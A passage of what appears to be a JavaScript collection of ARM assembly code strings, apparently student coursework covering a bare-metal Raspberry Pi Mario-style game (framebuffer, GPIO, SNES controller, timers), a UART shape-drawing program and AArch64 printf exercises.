		  	// offset *= 2 (for 16 bits per pixel = 2 bytes per pixel)
		  	lsl		offset, #1
		  	// store the colour (half word) at framebuffer pointer + offset
		  	ldr	r0, =FrameBufferPointer
		  	ldr	r0, [r0]
		  	strh	r2, [r0, offset]
		  	pop		{r4}
		  	bx		lr

		.globl updateScreen
		updateScreen:
		  push {r4, r5, r6, lr}

		  //if screen number is one switch to 2, if it is two, switch to three
		  ldr r4, =screenNumber
		  ldr r4, [r4]
		  cmp r4, #1
		  bleq clearScreenOne

		  cmp r4, #2
		  bleq clearScreenTwo

		  cmp r4, #3
		  //bleq clearScreenThree



		  pop {r4, r5, r6, lr}
		  mov pc, lr

		clearScreenOne:
		    push {lr}
		    ldr r0, =block1      //make this the value to start printing mario  //this will be the address value to mario's x
		    ldr r0, [r0]
		    ldr r1, =block1
		    ldr r1, [r1, #4]
		    bl clearBox

		    ldr r0, =cblock
		    ldr r0, [r0]
		    ldr r1, =cblock
		    ldr r1, [r1, #4]
		    bl clearBox

		    ldr r0, =block2
		    ldr r0, [r0]
		    ldr r1, =block2
		    ldr r1, [r1, #4]
		    bl clearBox

		    //add a clear shell enem function

		    //clear all the other things in screen if we add them
		    mov r2, #2
		    ldr r3, =screenNumber
		    str r2, [r3]

		    bl initializeScreenTwo
		    pop {lr}
		    mov pc, lr

		clearScreenTwo:
		    push {lr}

		    ldr r0, =pipe1
		    ldr r0, [r0]
		    ldr r1, =pipe1
		    ldr r1, [r1, #4]
		    bl clearPipe

		    ldr r0, =pipe2
		    ldr r0, [r0]
		    ldr r1, =pipe2
		    ldr r1, [r1, #4]
		    bl clearPipe

		    ldr r0, =dragonEnemy
		    ldr r0, [r0]
		    ldr r1, =dragonEnemy
		    ldr r1, [r1, #4]
		    bl clearDragon

		    ldr r0, =cblock2
		    ldr r0, [r0]
		    ldr r1, =cblock2
		    ldr r1, [r1, #4]
		    bl clearBox

		    ldr r0, =cblock3
		    ldr r0, [r0]
		    ldr r1, =cblock3
		    ldr r1, [r1, #4]
		    bl clearBox

		    bl initializeScreenThree
		    pop {lr}
		    mov pc, lr

		.globl initializeScreenTwo
		initializeScreenTwo:
		    push {lr}

		    ldr r0, =pipe1
		    ldr r0, [r0]
		    ldr r1, =pipe1
		    ldr r1, [r1, #4]
		    bl drawPipe

		    ldr r0, =pipe2
		    ldr r0, [r0]
		    ldr r1, =pipe2
		    ldr r1, [r1, #4]
		    bl drawPipe

		    ldr r0, =dragonEnemy
		    ldr r0, [r0]
		    ldr r1, =dragonEnemy
		    ldr r1, [r1, #4]
		    bl drawDragon

		    ldr r0, =cblock2
		    ldr r0, [r0]
		    ldr r1, =cblock2
		    ldr r1, [r1, #4]
		    bl drawCoinBlock

		    ldr r0, =cblock3
		    ldr r0, [r0]
		    ldr r1, =cblock3
		    ldr r1, [r1, #4]
		    bl drawCoinBlock

		    pop {lr}
		    mov pc, lr

		.globl initializeScreenThree
		initializeScreenThree:
		  push {lr}

		  ldr r0, =castle
		  ldr r0, [r0]
		  ldr r1, =castle
		  ldr r1, [r1, #4]
		  bl drawCastle

		  ldr r0, =bowser
		  ldr r0, [r0]
		  ldr r1, =bowser
		  ldr r1, [r1, #4]
		  bl drawBowser

		  ldr r0, =pit
		  ldr r0, [r0]
		  ldr r1, =pit
		  ldr r1, [r1, #4]
		  bl drawPit

		  ldr r0, =block3
		  ldr r0, [r0]
		  ldr r1, =block3
		  ldr r1, [r1, #4]
		  bl drawBlock

		  ldr r0, =block4
		  ldr r0, [r0]
		  ldr r1, =block4
		  ldr r1, [r1, #4]
		  bl drawBlock

		  pop {lr}
		  mov pc, lr`
	},
	m4: {
		type: 'arm',
		code: `
		.section .text
		.globl InitFrameBuffer
		/* Initialize the FrameBuffer using the FrameBufferInit structure
		 * Returns:
		 *	r0 - 0 on failure, framebuffer pointer on success
		 */
		InitFrameBuffer:
			// load the address of the mailbox interface
			mbox	.req	r2
			ldr		mbox,	=0x3F00B880

			// load the address of the framebuffer init structure
			fbinit	.req	r3
			ldr		fbinit,	=FrameBufferInit

		mBoxFullLoop$:
			// load the value of the mailbox status register
			ldr		r0,		[mbox, #0x18]

			// loop while bit 31 (Full) is set
			tst		r0,		#0x80000000
			bne		mBoxFullLoop$

			// add 0x40000000 to address of framebuffer init struct, store in r0
			add		r0, 	fbinit,	#0x40000000

			// or with the framebuffer channel (1)
			orr		r0, 	#0b1000

			// write this value to the mailbox write register
			str		r0,		[mbox, #0x20]

		mBoxEmptyLoop$:
			// load the value of the mailbox status register
			ldr		r0,		[mbox, #0x18]

			// loop while bit 30 (Empty) is set
			tst		r0,		#0x40000000
			bne		mBoxEmptyLoop$

			// read the response from the mailbox read register
			ldr		r0,		[mbox, #0x00]

			// and-mask out the channel information (lowest 4 bits)
			and		r1,		r0, #0xF

			// test if this message is for the framebuffer channel (1)
			teq		r1,		#0b1000

			// if not, we need to read another message from the mailbox
			bne		mBoxEmptyLoop$
			
			ldr		r0,	=FrameBufferInit
			ldr		r1,	[r0, #0x04]	//load the request/response word from buffer
			teq		r1,	#0x80000000	//test is the request was successful
			beq		pointerWaitLoop$	
			movne		r0, 	#0		//return 0 if the request failed
			bxne		lr	

		pointerWaitLoop$:
			ldr	r0, 	=FrameBuffer 
			ldr	r0, 	[r0]
			teq	r0,	#0	//test if framebuffer pointer has been set
			
			beq	pointerWaitLoop$
			
			ldr 	r3, =FrameBufferPointer
			str	r0, [r3]

			.unreq	mbox
			.unreq	fbinit

			bx	lr

		.section .data

		.align 4
		FrameBufferInit:

			.int 	22 * 4			//Buffer size in bytes
			.int	0			//Indicates a request to GPU
			.int	0x00048003		//Set Physical Display width and height
			.int	8			//size of buffer
			.int	8			//length of value
			.int	1024			//horizontal resolution
			.int	768			//vertical resolution

			.int	0x00048004		//Set Virtual Display width and height
			.int	8			//size of buffer
			.int	8			//length of value
			.int 	1024			//same as physical display width and height
			.int 	768

			.int	0x00048005		//Set bits per pixel
			.int 	4			//size of value buffer
			.int	4			//length of value
			.int	16			//bits per pixel value

			.int	0x00040001		//Allocate framebuffer
			.int	8			//size of value buffer
			.int	8			//length of value
		FrameBuffer:
			.int	0			//value will be set to framebuffer pointer
			.int	0			//value will be set to framebuffer size			

			.int	0			//end tag, indicates the end of the buffer

		.align 4
		.globl FrameBufferPointer
		FrameBufferPointer:
			.int	0`
	},
	m5: {
		type: 'arm',
		code: `
		.section    .init
		.globl     _GameLoop

		_GameLoop:
		    b GameLoop

		.section .text

		GameLoop:
			push {r4-r10,lr}
		restart:
			//reste all game object values to what they were initially, then call the initialize function in drawing functions
		.globl GL
		GL:	mov r7, #0                  //move 0 into register r7
		    bl _ReadSNES                //call to subroutine which reads info from controller
		loop:
		    cmp r7, #15                 //check to see if we have read all the bits in the buffer
		    bge GL                      //if true then reset and look for more info from the controller
		    ldr r5, =buttons            //load the address of the buffer into r5
		    ldrb r4, [r5, r7]           //load a byte from the buffer
		    add r7, r7, #1              //increment the offset
		    cmp r4, #1                  //if a 1 is ever read (button not pressed) skip over it
		    beq loop                    //if true branch to loop
		    bl _UpdateSprites
		    //bl _updateScore
		    //ldr r5, =score
		    //ldrb r4, [r5]
		    //cmp r4, #0
		    //beq loseScreen
		    //cmp r4, #7
		    //beq winscreen
		    //cmp r4, #0
		    //bgt GL
		    pop {r4-r10,lr}
		    bx lr`
	},
	m6: {
		type: 'arm',
		code: `
		.section    .init
		.globl _InitAll

		.section	.text
		_InitAll:
		    b InitClock

		InitClock:
		    ldr r0, =0x3F200004         //address for GPFSEL1
		    ldr r1, [r0]                //loads the contents of address into r1
		    mov r2, #7                  //creates bitmask
		    lsl r2, #3                  //align for 1st index of pin 11
		    bic r1, r2                  //clear bit at pin 11
		    mov r3, #1                  //output function code
		    lsl r3, #3                  //r3 = 0 001 000
		    orr r1, r3                  //sets the pin 11 function in r1
		    str r1, [r0]                //stores it back into GPFSEL1

		InitLatch:
		    ldr r0, =0x3F200000         //address for GPFSEL0
		    ldr r1, [r0]                //loads the contents of address into r1
		    mov r2, #7                  //creates bitmask
		    lsl r2, #27                 //align for 1st index of pin 9
		    bic r1, r2                  //clear bit at pin 9
		    mov r3, #1                  //output function code
		    lsl r3, #27                 //r3 = 001 000 000 000 000 000 000 000 000
		    orr r1, r3                  //sets the pin 9 function in r1
		    str r1, [r0]                //stores it back into GPFSEL0

		InitData:
		    ldr r0, =0x3F200004         //address for GPFSEL1
		    ldr r1, [r0]                //loads the contents of address into r1
		    mov r2, #7                  //creates a bitmask
		    bic r1, r2                  //clears bit at pin 10
		    mov r3, #1                  //r3 = 0 001
		    add r3, r1                  //sets the pin 10 function into GPFSEL1
		    str r1, [r0]                //stores it back into GPFSEL0


		    bx lr`
	},
	m7: {
		type: 'arm',
		code: `//	define	some	hardware	registers	necessary
		.equ	GPFSEL0,	0x3F200000	//	GPIO	Function	Select	0
		.equ	GPFSEL2,	0x3F200008	//	GPIO	Function	Select	2

		.equ	GPPUD,		0x3F200094	//	GPIO	Pull-up/down	Register
		.equ	GPPUDCLK0,	0x3F200098	//	GPIO	Pull-up/down	Clock

		.section	.text

		.globl EnableJTAG
		EnableJTAG:
			push	{lr}
			//	disable	all	pull	ups/downs
			ldr		r0,	=GPPUD
			eor		r1,	r1
			str		r1,[r0]
			bl		dowait		//	wait	150	cycles	as	per	datasheet
			ldr		r0,	=GPPUDCLK0
			ldr		r1,	=0x0BC00010
			str		r1,[r0]
			bl		dowait		//	wait	150	cycles	again
			eor		r1,r1
			str		r1,[r0]
			
			//	define	ALT5	function	for	GPIO4	(JTAG	TDI	line)
			ldr		r0,	=GPFSEL0
			ldr		r1,[r0]
			bic		r1,	r1,	#0x7000
			orr		r1,	r1,	#0x2000
			str		r1,[r0]

			//	define	ALT4	functions	for	GPIOs	22,24,25,27
			ldr		r0,	=GPFSEL2
			ldr		r1,[r0]
			ldr		r2,	=0x00E3FFC0
			bic		r1,	r1,	r2
			ldr		r2,	=0x0061B6C0
			orr		r1,	r1,	r2
			str		r1,[r0]

			pop		{pc}

		dowait:
			mov	r2,	#300
		dowaitloop:
			subs	r2,	#1
			bne	dowaitloop
			bx	lr`
	},
	m8: {
		type: 'arm',
		code: `
		.section    .init
		.globl     _start

		_start:
		    b main

		.section .text
		main:
		    mov	sp, #0x8000         // Initializing the stack pointer
		    bl	EnableJTAG          // Enable JTAG
		    //bl	InstallIntTable
			ldr	r0, =0x2000B218
			ldr	r1, [r0]
			orr	r1, #1
			str	r1, [r0]
			ldr		r0, =0x20003000	// clear bit in the event detect register
			mov		r1, #0x002
			str		r1, [r0]
			ldr	r0, =0x2000B210		//Enable clock IRQ interupts
			ldr	r1, [r0]			//The contents into r1
			orr	r1, #2				//Enable bit 1 for c1 interupts
			str	r1, [r0]			//And store it back
			mrs	r0, cpsr 			//Enable IRQ interupts
			bic	r0, #0x80
			msr	cpsr_c, r0
		    bl 	_InitAll
		    //bl 	_StartScreen
		nG: bl 	initialscreen

		cycle:
		    bl 	_GameLoop
		    b cycle


		Quit:



		//InstallIntTable:
		//	ldr		r0, =IntTable
		//	mov		r1, #0x00000000
		//	ldmia	r0!, {r2-r9}	// load the first 8 words and store at the 0 address
		//	stmia	r1!, {r2-r9}
		//	ldmia	r0!, {r2-r9}	// load the second 8 words and store at the next address
		//	stmia	r1!, {r2-r9}
		//	mov		r0, #0xD2		// switch to IRQ mode and set stack pointer
		//	msr		cpsr_c, r0
		//	mov		sp, #0x8000
		//	mov		r0, #0xD3		// switch back to Supervisor mode, set the stack pointer
		//	msr		cpsr_c, r0
		//	mov		sp, #0x8000000
		//	bx		lr


		hang:
			b hang



		.section	.data

		.globl buttons
		buttons:
			.byte 16
			.rept 1
			.endr





		.globl mariowidth
		mariowidth:
				.int 67
		.global marioheight
		marioheight:
				.int 117
		//IntTable:
		//	ldr		pc, reset_handler
		//	ldr		pc, undefined_handler
		//	ldr		pc, swi_handler
		//	ldr		pc, prefetch_handler
		//	ldr		pc, data_handler
		//	ldr		pc, unused_handler
		//	ldr		pc, irq_handler
		//	ldr		pc, fiq_handler

		//reset_handler:		.word InstallIntTable
		//undefined_handler:	.word hang
		//swi_handler:		.word hang
		//prefetch_handler:	.word hang
		//data_handler:		.word hang
		//unused_handler:		.word hang
		//irq_handler:		.word irq
		//fiq_handler:		.word hang`
	},
	m9: {
		type: 'arm',
		code: `
		.section	.init
		.globl	_ReadData

		.section	.text
		_ReadData:
			push {r4-r10, lr}
			b ReadData

		ReadData:
		    mov r0, #10                 //we are dealing with pin 10
		    ldr r2, =0x3F200000         //move the base GPIO address into r2
		    ldr r1, [r2, #52]           //load GPLEV0 into r1
		    mov r3, #1                  //move 1 into r3
		    lsl r3, r0                  //allight value to the position of bit 10
		    and r1, r3                  //apply bitmask to others bits
		    teq r1, #0                  //test if the value of pin 10 is 0
		    moveq r0, #0                //return that value read was 0
		    movne r0, #1                //return that value read was 1
		    pop {r4-r10, lr}
		    bx lr`
	},
	m10: {
		type: 'arm',
		code: `
		.section    .init
		.globl	_ReadSNES

		.section    .text
		_ReadSNES:
		    b ReadSNES

		ReadSNES:
			push {r4-r10,lr}            //stores contents of registers
		    mov r1, #1                  //load bit to write to clock
		    bl _WriteClock              
		    mov r1, #1                  //load bit to write to latch
		    bl _WriteLatch
		    mov r0, #12
		    bl _Wait                    //wait 12 microseconds
		    mov r1, #0                  //load bit to write to latch
		    bl _WriteLatch
		    mov r7, #0                  //set offset to 0
		    mov r0, #2000
		    bl WaitLong
		pulseLoop:
		    mov r0, #6
		    bl _Wait                    //wait 6 microseconds
		    mov r1, #0                  //load bit to write to clock
		    bl _WriteClock
		    mov r0, #6              
		    bl _Wait                     //wait 6 microseconds
		    bl _ReadData                //read a bit from the data pin
		    ldr r5, =buttons            //loads address of buffer into r5
		    strb r0, [r5, r7]           //stores the bit returned from Read_Data into buffer with offset
		    add r7, r7, #1              //increment offset
		    mov r1, #1                  //load bit to write to clock
		    bl _WriteClock
		    cmp r7, #16                 //checks if offset is 16
		    blt pulseLoop               //if it is less, then branch back to read another bit
		    pop {r4-r10, lr}            //restores registers
		    bx lr                       //return to calling code`
	},
	m11: {
		type: 'arm',
		code: `
		.section    .init
		.globl     _UpdateSprites

		_UpdateSprites:
		    b UpdateSprites

		.section .text

		UpdateSprites:
			push {r4-r10, lr}
			cmp r7, #1                  //checks clock cycle #
		    beq B
		    cmp r7, #2                  //checks clock cycle #
		    beq Y
		    cmp r7, #3                  //checks clock cycle #
		    beq Sel
		    cmp r7, #4                  //checks clock cycle #
		    beq St
		    cmp r7, #5                  //checks clock cycle #
		    beq JPU
		    cmp r7, #7                  //checks clock cycle #
		    beq JPL
		    cmp r7, #8                  //checks clock cycle #
		    beq JPR
		    cmp r7, #9                  //checks clock cycle #
		    beq A
		    cmp r7, #10                 //checks clock cycle #
		    beq X
		    cmp r7, #11                 //checks clock cycle #
		    beq LB
		    cmp r7, #12                 //checks clock cycle #
		    beq RB
		    cmp r7, #13                 //checks clock cycle #
		    bge GL                      //if we read offset to be an unused button branch back to read again from controller


		B:
			cmp r4, #0
			beq BPress
		Y:
			cmp r4, #0
			bleq YPress
		Sel:
			cmp r4, #0
			beq SelPress
		St:
			cmp r4, #0
			bleq STPress
			b GL
		JPU:
			cmp r4, #0
			bleq JPUPress
			b GL
		JPL:
			cmp r4, #0
			beq JPLPress
		JPR:
			cmp r4, #0
			beq JPRPress
		A:
			cmp r4, #0
			beq APress
		X:
			cmp r4, #0
			beq XPress
		LB:
			cmp r4, #0
			beq LBPress
		RB:
			cmp r4, #0
			beq RBPress


		EnemyUpdate:

		  @ldr r5, =screenNumber
		  @ldr r5, [r5]
		  @
		  @mov r6, #1
		  @cmp r5, r6
		  @bleq updateShell
		  @
		  @mov r6, #2
		  @cmp r5, r6
		  @bleq updateDragon
		  @
		  @mov r6, #3
		  @cmp r5, r6
		  @bleq updateBowser

			beq blockUpdate

		@updateShell:
		@    push {r4-r10,lr}
		@    ldr r8, =shellEnemy
		@    ldr r4, [r5]
		@    sub r6, r4, #5
		@    cmp r6, #0
		@    bgt drawL
		@    b donel
		@drawL:
		@    bl clearShell
		@    str r6, [r5]
		@    bl drawShell
		@donel:
		@    pop {r4-r10, lr}
		@    bx lr
		@
		@updateDragon:
		@    push {r4-r10,lr}
		@    ldr r8, =dragonEnemy
		@    ldr r4, [r5]
		@    sub r6, r4, #5
		@    cmp r6, #0
		@    bgt drawL
		@    b donel
		@drawL:
		@    bl clearDragon
		@    str r6, [r5]
		@    bl drawDragon
		@donel:
		@    pop {r4-r10, lr}
		@    bx lr


		blockUpdate:
			pop {r4-r10, lr}
			bx lr`
	},
	m12: {
		type: 'arm',
		code: `
		.section    .init
		.globl  _Wait

		.section    .text
		_Wait:
		    push {r4-r10,lr}
		    mov r4, r0
		    b Wait

		Wait:
		    ldr r0, =0x3F003004         //CLO
		    ldr r1, [r0]                //get value of CLO in r1
		    add r1, r4                  //add a certain time in microseconds (passed as param)
		LoopInWait:
		    ldr r0, =0x3F003004         //CLO
		    ldr r2, [r0]                //get value of CLO in r1
		    cmp r2, r1                  //when CLO is equal to r1 we break
		    blt LoopInWait
		    pop {r4-r10,lr}
		    bx lr                       //if equal then return to calling code

		.globl WaitLong
		WaitLong:
		    push {r4-r10,lr}
		    mov r4, r0
		    mov r5, #60
		    mul r4, r4, r5
		    ldr r0, =0x3F003004
		    ldr r1, [r0]
		    add r1, r4
		LoopInWaitL:
		    ldr r0, =0x3F003004         //CLO
		    ldr r2, [r0]                //get value of CLO in r1
		    cmp r2, r1                  //when CLO is equal to r1 we break
		    blt LoopInWaitL
		    pop {r4-r10,lr}
		    bx lr                       //if equal then return to calling code`
	},
	m13: {
		type: 'arm',
		code: `
		.section	.init
		.globl	_WriteClock

		.section	.text
		_WriteClock:
			push {r4-r10, lr}
			mov r4, r1
			b WriteClock


		WriteClock:
			mov r0, #11                 //we are dealing with pin 11
		    ldr r2, =0x3F200000         //the base GPIO address to use
		    mov r3, #1                  //write a bit
		    lsl r3, r0                  //align bit to pin #11
		    teq r4, #0                  //test what bit we want to write
		    streq r3, [r2, #40]         //write 1 to GPCLR0
		    strne r3, [r2, #28]         //write 1 to GPSET0
		    pop {r4-r10, lr}
		    bx lr`
	},
	m14: {
		type: 'arm',
		code: `
		.section	.init
		.globl	_WriteLatch

		.section	.text
		_WriteLatch:
			push {r4-r10, lr}
			mov r4, r1
			b WriteLatch

		WriteLatch:
		    mov r0, #9                  //we are dealing with pin 9
		    ldr r2, =0x3F200000         //the base GPIO address to use
		    mov r3, #1                  //write a bit
		    lsl r3, r0                  //align bit to pin #9
		    teq r4, #0                  //test what bit we want to write
		    streq r3, [r2, #40]         //write 1 to GPCLR0
		    strne r3, [r2, #28]         //write 1 to GPSET0
		    pop {r4-r10, lr}
		    bx lr                       //branch back to calling code`
	},
	m15: {
		type: 'arm',
		code: `
		.section    .init
		.globl     _start

		_start:
		    b       main
		.section .text

		main:
		    	mov     	sp, #0x8000                                                             	// Initializing the stack pointer
			bl		EnableJTAG                                                              	// Enable JTAG
			bl		InitUART
			mov r8, #0 //Square
			mov r2, #0 //Rectangle
			mov r3, #0 //Triangle
		        ldr r0, =string0
		        mov r1, #40
		        bl WriteStringUART
		Userask:
		        ldr r0, =strAsk
		        mov r1, #96
			bl WriteStringUART
			ldr r0, =strCh
			mov r1, #38
			bl WriteStringUART                                                              		 //This is important to be  able to use UART
		getInp:
			ldr r0, =Buffer
			mov r1, #256
			bl ReadLineUART
			ldr r5, [r0, 1]
			ldr r6, [r0]
			cmp r5, #45
			beq c1
			cmp r5, #0
			bne inperr
		c1:
			cmp r6, #49
			beq summary
		c2:
			cmp r6, #113
			beq exit
			cmp r6, #49
			blt berror
			cmp r6, #49
			beq square
			cmp r6, #50
			beq rectan
			cmp r6, #51
			beq tria
			cmp r6, #51
			bgt berror

		getwid:
			ldr r0, =shpAsk
			mov r1, #58
			bl WriteStringUART

			ldr r0, =Buffer
			mov r1, #256
			bl ReadLineUART
			ldr r4,[r0, 1]
			cmp r4, #0
			bne berror
			ldr r4, [r0]
			cmp r4, #3
			blt berror
			cmp r4, #9
			bgt berror
			mov r9, r4
			

		square:
			str r12, [sj] //ASK TA ON WEDNESDAY
		sj:	mov r10, #0
		break:	add r10, r10, #1
			cmp r10, r9
			bgt done
			ldr r0, =newLine
			ldr r1, 1
			bl WriteStringUART
			mov r11, #1
		break2:	cmp r11, r9
			beq break
			ldr r0, =drawShp
			mov r1, #1
			bl WriteStringUART
			add r8, r8, #1
			add r11, r11, #1
			b break2

		rectan:
			bl getwid
			mov r10, #0
			sub r7, r9, #2
		break3:	add r10, r10, 1
			cmp r10, r7
			bgt done
			ldr r0, =newLine
			ldr r1, 1
			bl WriteStringUART
			mov r11, #1
		break4:	cmp r11, r9
			beq break3
			ldr r0, =drawShp
			mov r1, #1
			bl WriteStringUART
			add r2, r2, #1
			add r11, r11, #1
			b break4

		triang:
			bl getwid
			mov r10, #0
			mov r7, r9
		break5:
			mov r11, #0
		break6:
			ldr r0, =newSpc
			ldr r1, #1
			bl WriteStringUART
			add, r11, r11, #1
			cmp r11, r7
			ble break7
		break7:
			mov r11, #0
		breakk7:
			add r11, r11, #1
			ldr r0, =drawShp
			ldr r1, #1
			bl WriteStringUART
			ldr r0, =newSpc
			ldr r1, #1
			bl WriteStringUART
			cmp r11, r10
			ble breakk7
		1up:
			ldr r0, =newLine
			ldr r1, #1
			bl WriteStringUART
			sub r7, r7, #1
			add r10, r10, #1
			cmp r10, r9
			ble break5
			b Userask

		summary:






			ldr r0, =string0 	                                                                        //Address of the label in data section containing the data you want to print	
			mov r1, #7		                                                                        //Number of characters to print
			bl WriteStringUART

			ldr r0, =string0 	                                                                        //Address of the label in data section containing the data you want to print
			add r0,#7			                                                                //Here I am moving the address to another ascii in this table. Keep in mind each character needs one byte.
			mov r1, #6	                                                                                //Number of characters needed to be print
			bl WriteStringUART

			ldr r0,=Buffer											//The buffer which will store user input. user input will be stored interns of bytes using ascii
			mov r1, #256											// Number of bytes allocated for user input in the memory
			bl ReadLineUART											// it will return in r0 number of characters user entered



		.section .data  
		string0:
			.ascii "Created By: Josh Dow\r\n"
			.align

		strAsk:
		        .ascii "Please enter the number of the object you wish to draw. Press -1 for summary. Press q to exit\n"
			.align
		strCh:
		        .ascii "1- Square; 2- Rectangle; 3- Triangle\n"
		        .align

		inErr:
		        .ascii "Wrong number format! q is the only allowed character\n"
		        .align
		bndErr:
		        .ascii "Invalid number! The number should be between 1 and 3 or -1 for summary\n"
		        .align

		shpAsk:
		        .ascii "Please enter the width of object. Must be between 3 and 9\n"
		        .align

		drawShp:
		        .ascii "*"

		newLine:
			.ascii "\n"
			.align
		newSpc:
			.ascii " "
			.align
		dspSum:
		        .ascii "Total Number of stars is: %d\n"
		        .ascii "Mean of Stars used to draw Square(s): %d\n"
		        .ascii "Mean of Stars used to draw Rectangle(s): %d\n"
		        .ascii "Mean of Stars used to draw Traingle(s): %d\n"
		        .align
		trmprg:
		        .ascii "Terminating Program\n"
		        .align


		Buffer:
			.rept 256
			.byte 0
			.endr`
	},
	m16: {
		type: 'arm',
		code: `
										//Created by: Joshua Dow, 10150588.
		define(i_r, x19)
		define(c_r, x20)
		define(x12_r, x25)
		define(x3_r, x26)



		fmt:    	.string "The values of x,y are: %d,%d and the current minimum is: %d\n"				//Declares the value of the string
				.balign 4											//Puts string in multiples of 4-bytes
				.global main											//Makes string globally available


		fmt_r:		.string "The final minimum was: %d. The program is now over\n"					//Delcares the value of the string
				.balign 4 											//Puts string in multiples of 4-bytes
				.global main 											//Makes string globally available


		main:		stp x29, x30, [sp, -16]! 									//Shifts the stack by -16 bytes
				mov x29, sp 											//Initializing stack space
				mov i_r, -6 											//Setting default value for loop
				mov x24, 0x2710 										//Setting high minimum value

		Top_Of_Loop:	mov c_r, -0x2B 											//Sets x20 to -43
				mov x12_r, 0x1B 											//Sets x25 to 27
				mov x3_r, 0x5 											//Sets x26 to 5
				mneg x21, i_r, x12_r 										//Storing the product of i_r and -27
				add c_r, c_r, x21 										//Storing the sum of x20 and x21
				mul x21, i_r, i_r 										//Storing the product of i_r^2
				madd c_r, x21, x12_r, c_r
				mul x21, i_r, x21
				madd c_r, x21, x3_r, c_r 										//Storing the sum of x23 and x20
				cmp c_r, x24 											//Compares two registers, if negative will set new min
				b.mi set_min 											//Sets the new min value
		Mid_Loop:	adrp x0, fmt 											//Adding high-order bits
				add x0, x0, :lo12:fmt 										//Adding low-order bits
				mov x1, i_r 											//Declaring x value
				mov x2, c_r 											//Declaring y value
				mov x3, x24 											//Declaring min
				bl printf 											//Prints to standard output
				add i_r, i_r, 1 										//Increments by 1 to traverse through loop
		test:		cmp i_r, 7 											//Test to control flow of loop
				b.eq Post_Loop 											//Moves to the post loop info
				b Top_Of_Loop 											//Jumps to top of loop

		set_min:	mov x24, c_r 											//Moves the value of x20 into x24
				b Mid_Loop 											//Jumps back to the loop

		Post_Loop:
				adrp x0, fmt_r 											//Adding high-order bits
				add x0, x0, :lo12:fmt_r 									//Adding low-order bits
				mov x1, x24 											//Moving the minimum value into a temp register
				bl printf 											//Prints to standard output
				b done 												//Final branch to restore the stack

		done:		ldp x29, x30, [sp], 16 										//Restores the stack and finializes the program
				ret 												//Returns from sub-routine`
	},
	m17: {
		type: 'arm',
		code: `
		//Created by Joshua Dow, 10150588
		//PLEASE READ: Could not makes registers x19-x21 to be w19-w21 due to reoccuring mismatch errors.


		define(mult_r, x19)					//Assigning macro to x19
		define(mulc_r, x20)					//Assigning macro to x20
		define(prod_r, x21)					//Assigning macro to x21
		define(i_r, w22)					//Assigning macro to w22
		define(n_r, w23)					//Assigning macro to w23
		define(lire_r, x24)					//Assigning macro to x24
		define(temp1_r, x25)					//Assigning macro to x25
		define(temp2_r, x26)					//Assigning macro to x26

		str1:   .string "multiplier = 0x%08x multiplicand = 0x%08x \n\n"//Assigning a string value
			.balign 4						//Aligning bytes for the string
			.global main						//Making accessible to main
		str2:	.string "product = 0x%08x multiplier = 0x%08x\n"	//Assigning a string value
			.balign 4						//Aligning bytes for the string
			.global main						//Making accessible to main
		str3:	.string "64-bit result = 0x%0161x %1d\n"		//Assigning a string value
			.balign 4						//Aligning bytes for the string
			.global main						//Making accessible to main
		main:	stp x29, x30, [sp, -16]!				//Creating room in the stack
			mov x29, sp						//Putting stack in a register
			mov mulc_r, -268435456					//Giving x20 a value 
			mov mult_r, 50						//Giving x19 a value
			mov prod_r, 0						//Giving x21 a value
		print1:	adrp x0, str1						//Gives x0 the address of str1
			add x0, x0, :lo12:str1					//Places low order bits into x0
			mov x1, mult_r						//Preparing to print x19
			mov x2, mulc_r						//Preparing to print x20
			bl printf						//Calls printf function
			cmp mult_r, 0						//Compares the value of x19 to 0
			b.ge neg0						//If x19 is >= 0, branch to neg0
			mov n_r, 1						//Else set w23 to 1 (TRUE)
			b loops							//Then branch to start of loop
		neg0:	mov n_r, 0						//Else if set w23 to 0 (FALSE)
		loops:	mov i_r, 0						//Initialize i to 0
		loopb:	cmp i_r, 31						//Compare i to 31
			b.gt loopf						//If > 31, branch to end of loop
			and mult_r, mult_r, 1					//Else perform AND on x19 & 1
			cmp mult_r, 0						//Compare x19 to 0
			b.eq next						//If x19 == 0, branch to next
			add prod_r, mult_r, prod_r				//Else add x21 to x19
		next:	asr mult_r, mult_r, 1					//Arthitmetic shift right x19 by 1
			and prod_r, prod_r, 1					//Perform AND on x21 & 1
			cmp prod_r, 0						//Compare x21 to 0
			b.eq else1						//If x21 == 0 branch to else1
			orr mult_r, mult_r, 0x80000000				//Perform inclusive or on x19 and 0x80000000
			b next2							//Branch to next2
		else1:	bic mult_r, mult_r, 0x7FFFFFFF				//Bit clear x19 by 0x7FFFFFFF
		next2:	add i_r, i_r, 1						//Incremement i by 1
			b loopb							//Branch to loop body
			asr prod_r, prod_r, 1					//Arthimetic shift right x21 by 1
		loopf:	cmp n_r, 0						//Compare w23 to 0 (FALSE)
			b.eq print2						//If w23 == 0, branch to print 2
			sub prod_r, prod_r, mult_r				//Else subtract x19 from x21
		print2: adrp x0, str2						//Gives x0 the value of str2
			add  x0, x0, :lo12:str2					//Places low order bits of str2 into x0
			mov x1, prod_r						//Places value of x21 into x1
			mov x2, mult_r						//Places value of x19 to x2
			bl printf						//Calls printf
			and temp1_r, prod_r, 0xFFFFFFF				//Performs AND on x21 & 0xFFFFFFFF
			lsl temp1_r, temp1_r, 32				//Logical shift left x25 by 32
			and temp2_r, mult_r, 0xFFFFFFF				//performs AND on x19 & 0xFFFFFFFF
			add lire_r, temp2_r, temp1_r				//Places the sum on x25 and x26 into results
		print3:	adrp x0, str3						//Places value of str3 into x0
			add x0, x0, :lo12:str3					//Places low order bits of str3 into x0
			mov x1, lire_r						//Moves the final result into x1
			bl printf						//Calls printf
		done:	ldp x29, x30, [sp], 16					//Restores the stack
			ret 							//Calls return and exits the program`
	},
	m18: {
		type: 'arm',
		code: `
		//Created by Joshua Dow, 10150588.
		define(v_s, w20)
		define(i_s, w21)
		define(j_s, w22)
		define(offset_r, x19)
		define(base_r, x23)
		define(temp_r, w27)
		alloc = -(16 + 160 + 12 + 32) & -16	//Allocating memory
		dealloc = -alloc			//Will be used later to deallocate
		fmt: 	.string "v[%d]: %d\n"		//Declaring string
		fmt1:	.string "\nSorted array: \n"	//Declaring string
		fmt2:	.string "v[%d]: %d\n"		//Declaring string
			.balign 4			//Aligning memory
			.global main			//Makes it available to main
		main:
			stp x29, x30, [sp, alloc]! 	//Allocated for main, array, temp, i, and j
			mov x29, sp			//Moving Stack Pointer to point to FP
			mov v_s, 77			//Initializing with random value
			mov i_s, 0			//Setting i to 0
			mov j_s, 1			//Setting j to 1
			mov base_r, 24			//Setting base address of the array to 24
